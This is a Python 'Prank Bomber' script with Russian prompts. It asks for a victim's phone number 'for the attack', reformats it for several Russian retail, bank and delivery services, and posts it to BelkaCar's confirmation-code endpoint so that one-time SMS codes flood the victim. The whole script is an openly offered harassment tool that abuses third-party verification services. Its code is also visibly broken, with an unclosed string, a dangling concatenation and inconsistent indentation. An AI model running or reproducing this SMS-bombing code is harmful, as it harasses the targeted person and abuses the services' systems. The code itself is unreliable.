import requests, random, datetime, sys, time, argparse, os
import threading
banner = """
 ____________________________________________________
|                                                    |
| [--] with love by: Norman                                 |
|                                                    |
| [--] Have Services: 51                             |
|                                                    |
| [--] Prank Bomber      |
|                                                    |
| [--] Version: 1.0.0                               |
|____________________________________________________|
"""
print(banner)
_phone = input('Здарова! Введи номер для атаки 
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7'+_phone[1:]
if _phone[0] == '9':
    _phone = '7'+_phone

_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+')'+
_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
def sent():
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
print('[+] BelkaCar отправлено!')
    except:
        print('[-] смс  было отправлено!')